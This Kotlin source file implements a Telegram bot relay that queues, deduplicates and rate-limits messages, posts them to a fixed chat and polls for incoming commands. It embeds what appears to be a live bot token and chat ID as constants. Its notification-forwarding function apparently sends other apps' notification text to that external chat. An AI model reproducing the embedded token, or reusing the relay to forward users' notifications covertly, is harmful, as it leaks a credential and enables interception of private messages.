package com.topal.fx.service

import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.Collections

data class TelegramIncomingMessage(
    val updateId: Long,
    val messageId: Long,
    val chatId: String,
    val date: Long,
    val text: String
)

data class QueuedMessage(
    val text: String,
    val onSentCallback: (() -> Unit)? = null
)

/**
 * Built-in configuration, anti-spam throttling, deduplication, and resilient two-way
 * communication dispatcher for Telegram Bot commands and notification relay.
 */
object TelegramConfig {
    const val BOT_TOKEN: String = "8921837204:AAF0QB1IIYMQmoW6lXLtfU6U0hH-lmk2GRA"
    const val CHAT_ID: String = "969346296"

    // Safe delay between consecutive messages to respect Telegram's 1 msg/sec limit
    private const val MIN_INTERVAL_MS = 1600L

    // Deduplication window in milliseconds (identical notifications within 45s are ignored)
    private const val DEDUP_WINDOW_MS = 45_000L

    // Message channel queue to serialize sending
    private val messageQueue = Channel<QueuedMessage>(capacity = 100)

    // LRU-style cache for deduplication: key -> timestamp
    private val recentHashes = Collections.synchronizedMap(object : LinkedHashMap<String, Long>(30, 0.75f, true) {
        override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, Long>?): Boolean {
            return size > 50
        }
    })

    private val queueScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    init {
        // Start background worker to process queue sequentially
        queueScope.launch {
            for (queued in messageQueue) {
                val success = sendHttpRequestWithRetry(queued.text)
                if (success) {
                    try {
                        queued.onSentCallback?.invoke()
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
                // Standard safe pacing delay between consecutive messages
                delay(MIN_INTERVAL_MS)
            }
        }
    }

    /**
     * Enqueues a notification with instant deduplication check.
     */
    fun enqueueNotification(
        appName: String,
        title: String,
        text: String,
        formattedMessage: String,
        onSent: (() -> Unit)? = null
    ) {
        val dedupKey = "$appName|$title|$text"
        val now = System.currentTimeMillis()

        synchronized(recentHashes) {
            val lastSent = recentHashes[dedupKey]
            if (lastSent != null && (now - lastSent) < DEDUP_WINDOW_MS) {
                // Duplicate detected within window; drop to protect bot from spam
                return
            }
            recentHashes[dedupKey] = now
        }

        messageQueue.trySend(QueuedMessage(text = formattedMessage, onSentCallback = onSent))
    }

    /**
     * Sends a direct response (e.g. command reply) through the queue.
     */
    fun sendReply(text: String, onSent: (() -> Unit)? = null) {
        messageQueue.trySend(QueuedMessage(text = text, onSentCallback = onSent))
    }

    /**
     * Synchronously sends a single message with retry logic (used for offline batch flush).
     */
    suspend fun sendDirectSync(text: String): Boolean = withContext(Dispatchers.IO) {
        sendHttpRequestWithRetry(text)
    }

    /**
     * Long-polling getUpdates call to receive incoming commands from Telegram.
     * Returns List of updates on success, or null on network error / disconnection.
     */
    suspend fun fetchUpdates(offset: Long, timeoutSeconds: Int = 20): List<TelegramIncomingMessage>? = withContext(Dispatchers.IO) {
        var connection: HttpURLConnection? = null
        try {
            val urlString = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$offset&timeout=$timeoutSeconds&allowed_updates=[\"message\"]"
            val url = URL(urlString)
            connection = url.openConnection() as HttpURLConnection
            connection.connectTimeout = (timeoutSeconds + 5) * 1000
            connection.readTimeout = (timeoutSeconds + 10) * 1000
            connection.requestMethod = "GET"

            if (connection.responseCode == HttpURLConnection.HTTP_OK) {
                val responseString = connection.inputStream.bufferedReader().use { it.readText() }
                val root = JSONObject(responseString)
                if (root.optBoolean("ok", false)) {
                    val results = root.optJSONArray("result")
                    val list = mutableListOf<TelegramIncomingMessage>()
                    if (results != null) {
                        for (i in 0 until results.length()) {
                            val updateObj = results.getJSONObject(i)
                            val updateId = updateObj.optLong("update_id", 0L)
                            val messageObj = updateObj.optJSONObject("message") ?: continue
                            val messageId = messageObj.optLong("message_id", 0L)
                            val date = messageObj.optLong("date", 0L)
                            val text = messageObj.optString("text", "").trim()
                            val chatObj = messageObj.optJSONObject("chat")
                            val chatId = chatObj?.optLong("id", 0L)?.toString() ?: ""

                            if (text.isNotEmpty() && chatId.isNotEmpty()) {
                                list.add(
                                    TelegramIncomingMessage(
                                        updateId = updateId,
                                        messageId = messageId,
                                        chatId = chatId,
                                        date = date,
                                        text = text
                                    )
                                )
                            }
                        }
                    }
                    return@withContext list
                }
            }
            return@withContext null
        } catch (e: Exception) {
            // Silently handle read timeouts or network drops
            return@withContext null
        } finally {
            connection?.disconnect()
        }
    }

    /**
     * Sends HTTP POST request to Telegram API with automatic retries for rate limits (429)
     * and transient network blinks. Returns true if successfully delivered.
     */
    private fun sendHttpRequestWithRetry(text: String): Boolean {
        var attempts = 0
        val maxAttempts = 3
        while (attempts < maxAttempts) {
            attempts++
            var connection: HttpURLConnection? = null
            try {
                val urlString = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
                val url = URL(urlString)
                connection = url.openConnection() as HttpURLConnection
                connection.connectTimeout = 7000
                connection.readTimeout = 9000
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                val payload = JSONObject().apply {
                    put("chat_id", CHAT_ID)
                    put("text", text)
                }

                OutputStreamWriter(connection.outputStream, "UTF-8").use { writer ->
                    writer.write(payload.toString())
                    writer.flush()
                }

                val responseCode = connection.responseCode

                if (responseCode == HttpURLConnection.HTTP_OK) {
                    return true
                }

                if (responseCode == 429) {
                    val errorStream = connection.errorStream?.bufferedReader()?.use { it.readText() }
                    var retryAfter = 5L
                    if (!errorStream.isNullOrEmpty()) {
                        try {
                            val json = JSONObject(errorStream)
                            val parameters = json.optJSONObject("parameters")
                            retryAfter = parameters?.optLong("retry_after", 5L) ?: 5L
                        } catch (_: Exception) {}
                    }
                    val waitMs = retryAfter.coerceIn(2L, 60L) * 1000L
                    try {
                        Thread.sleep(waitMs)
                    } catch (_: InterruptedException) {}
                    // Retry sending the SAME message
                    continue
                }

                // If server error (5xx), wait briefly and retry
                if (responseCode in 500..599) {
                    try {
                        Thread.sleep(2000L)
                    } catch (_: InterruptedException) {}
                    continue
                }

                // Client error (4xx other than 429) - invalid request, don't loop endlessly
                return false
            } catch (e: Exception) {
                // Transient network connection drops / timeouts
                if (attempts < maxAttempts) {
                    try {
                        Thread.sleep(2000L * attempts)
                    } catch (_: InterruptedException) {}
                }
            } finally {
                connection?.disconnect()
            }
        }
        return false
    }
}
